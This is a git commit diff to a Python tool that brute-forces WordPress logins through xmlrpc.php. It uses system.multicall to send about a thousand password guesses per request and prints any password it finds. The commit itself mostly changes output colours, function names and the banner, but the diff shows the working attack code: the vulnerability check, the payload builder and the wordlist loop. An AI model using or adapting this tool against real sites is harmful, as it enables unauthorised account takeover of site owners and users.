75a60d6e73c2025d04e919daa35e62e475ee9723
Kavish Gour <kavishgr@protonmail.com>
2019-10-23 19:21:45 +0400

    colored output
    will update banner soon

--- xmlrpcbruteforce.py
+++ xmlrpcbruteforce.py
@@ -20,10 +20,13 @@
 #######################################################################################################
 
 import xml.etree.ElementTree as ET
+# from xml.sax.saxutils import escape
 from html import escape as esc
 import requests
 import math
 import sys
+from termcolor import colored, cprint
+from time import sleep
 #######################################################################################################
 #                                         COLORS                                                      #
 #######################################################################################################
@@ -36,9 +39,14 @@ class bcolors:
   ENDC      = '\033[0m'
   BOLD      = '\033[1m'
   UNDERLINE = '\033[4m'
+  CBLINK    = '\033[5m'
+  CYELLOW = '\033[33m'
 #######################################################################################################
 #                                         FUNCTIONS                                                   #
 #######################################################################################################
+
+def banner():
+  pass
 
 def verify(url): ## verify if target is vulnerable or not
 
@@ -49,14 +57,14 @@ def verify(url): ## verify if target is vulnerable or not
     r = requests.post(url, data=xmlrpc_methods, headers=headers)
     r.encoding = 'UTF-8'
     if "wp.getUsersBlogs" in r.text:
-        print(bcolors.OKBLUE + "Target is vulnerable." + bcolors.ENDC)
+        print(colored('[>]', 'green'), colored('Target is vulnerable.', 'white'))
     else:
-        print(bcolors.OKGREEN + "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
+        print(bcolors.CYELLOW + "Target is NOT vulnerable for Brute Forcing." + bcolors.ENDC)
         print("wp.GetUsersBlogs is not enabled.")
         print("Please report any incorrect results on GitHuB or DM on Twitter.")
         sys.exit(0)
 
-def parse_response(data):
+def admin(data):
   root = ET.fromstring(data)
   struct_nodes = root.findall(".//struct")
   count = 0
@@ -70,14 +78,14 @@ def parse_response(data):
 
   return False, count
 
-def send_payload(url, user, passwords):
+def bruteforcing(url, user, passwords):
   prefix = "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
   payload = ""
   suffix = "</data></array></value></param></params></methodCall>"
 
   for password in passwords:
     payload += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name>"
-    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + escape(password) + "</string></value>"
+    payload += "<value><array><data><value><array><data><value><string>" + user + "</string></value><value><string>" + esc(password) + "</string></value>"
     payload += "</data></array></value></data></array></value></member></struct></value>"
 
   data = prefix + payload + suffix 
@@ -91,69 +99,46 @@ def main(argv):
   if len(argv) < 3:
     print(bcolors.OKGREEN + "Created by: Kavish Gour\nVersion: 1.0"+ bcolors.ENDC)
     print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt username".format(argv[0]) + bcolors.ENDC)
-    print(bcolors.WARNING + "+ -- --=[For now it only works with a single username. Userlist enumeration in progress." + bcolors.ENDC)
-    print(bcolors.WARNING + "Try to add or remove 'www' if nothing works." + bcolors.ENDC)
+    print(bcolors.WARNING + "+ -- --=[Usage: {0} http://wordpress.org/xmlrpc.php passwords.txt userlist.txt".format(argv[0]) + bcolors.ENDC)
+    print(bcolors.WARNING + "Try adding 'www' if nothing works." + bcolors.ENDC)
     sys.exit(0)
-
+  
   url = argv[1] 
   wordlist = argv[2] 
-  user = argv[3] 
+  user = argv[3]
+  print("")
+  print(15 * '-' + "Examining Target" + 20 * '-')
+  print("") 
   verify(url)
   
-  print(bcolors.OKBLUE + "" + bcolors.ENDC)
-  print(bcolors.OKGREEN + """
-
-                    __     __     __    __     _____       _____      _____      ____                 
-                   (_ \   / _)    \ \  / /    (_   _)     (   __ \   (  __ \    / ___)                
-                     \ \_/ /      () \/ ()      | |        ) (__) )   ) )_) )  / /                    
-                      \   /       / _  _ \      | |       (    __/   (  ___/  ( (                     
-                      / _ \      / / \/ \ \     | |   __   ) \ \  _   ) )     ( (                     
-                    _/ / \ \_   /_/      \_\  __| |___) ) ( ( \ \_)) ( (       \ \___                 
-                   (__/   \__) (/          \) \________/   )_) \__/  /__\       \____)                
-                                                                                                          
- ______    ______     __    __   ________    _____      _________     ____     ______       ____    _____  
-(_   _ \  (   __ \    ) )  ( (  (___  ___)  / ___/     (_   _____)   / __ \   (   __ \     / ___)  / ___/  
-  ) (_) )  ) (__) )  ( (    ) )     ) )    ( (__         ) (___     / /  \ \   ) (__) )   / /     ( (__    
-  \   _/  (    __/    ) )  ( (     ( (      ) __)       (   ___)   ( ()  () ) (    __/   ( (       ) __)   
-  /  _ \   ) \ \  _  ( (    ) )     ) )    ( (           ) (       ( ()  () )  ) \ \  _  ( (      ( (      
- _) (_) ) ( ( \ \_))  ) \__/ (     ( (      \ \___      (   )       \ \__/ /  ( ( \ \_))  \ \___   \ \___  
-(______/   )_) \__/   \______/     /__\      \____\      \_/         \____/    )_) \__/    \____)   \____\ 
-                                                                                                           
-
-                  _____   _____  _  _  _ _______  ______ _______ ______       ______  __   __     
-                 |_____] |     | |  |  | |______ |_____/ |______ |     \      |_____]   \_/       
-                 |       |_____| |__|__| |______ |    \_ |______ |_____/      |_____]    |        
-                                                                                  
-                              ______  ______  _____  ______  _______ ______                    
-                             |______ |______ |       |_____] |______ |     \                   
-                             ______| |______ |_____  |_____] ______| |_____/                   
-                                                                                  
-
-
-
-    """ + bcolors.ENDC)
   print("")
+  
+  print(bcolors.WARNING + "--=[Target: " + bcolors.ENDC + url + bcolors.WARNING + "]=--" + bcolors.ENDC)
   print("")
-  print(bcolors.WARNING + "--=[Target: " + url + "]=--" + bcolors.ENDC)
 
   passwords = []
   iterations = 1 
   count = 0
 
-  print(bcolors.WARNING + "--=[Starting...]=--" + bcolors.ENDC)
+  print(colored(f"        \t[...Bruteforcing...]", 'cyan'))
 
   with open(wordlist, encoding="ISO-8859-1") as f:
     for line in f:
       passwords.append(line.rstrip()) 
       if count == 999:
 
-        response = send_payload(url, user, passwords)
-        found, index = parse_response(response)
+        response = bruteforcing(url, user, passwords)
+        found, index = admin(response)
         if found:
-          print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
-          print(bcolors.OKGREEN + "--=[Successful!]=--" + bcolors.ENDC)
+          cprint(f"{15 * '-'} BRUTEFORCE SUCCESSFULL  {15 * '-'}", attrs=['bold'])
+          cprint("--=[User found]=--", 'green', attrs=['blink'])
+          print("Login: " + user)
+          print("Password: " + passwords[index])
+          print(bcolors.OKGREEN + "--=[Exiting...]=--" + bcolors.ENDC)
+          print("")
           sys.exit(0)
         else:
+          # cprint(f"--=[Tried: {str(iterations * 1000)} passwords]=--", 'blue', attrs=['reverse'])
           print(bcolors.FAIL + "--=[Tried: " + str(iterations * 1000) + " passwords]=--" + bcolors.ENDC)
         del passwords[:]
         iterations += 1
@@ -161,9 +146,10 @@ def main(argv):
       count += 1
 
   if passwords:
-    response = send_payload(url, user, passwords)
-    found, index = parse_response(response)
+    response = bruteforcing(url, user, passwords)
+    found, index = admin(response)
     if found:
+      print("BRUTEFORCE SUCCESSFULL")
       print(bcolors.OKGREEN + "--=[User found! Success! " + user + "/" + passwords[index] + "]=--" + bcolors.ENDC)
       print(bcolors.OKGREEN + "--=[Successful!]=--" + bcolors.ENDC)
       sys.exit(0)
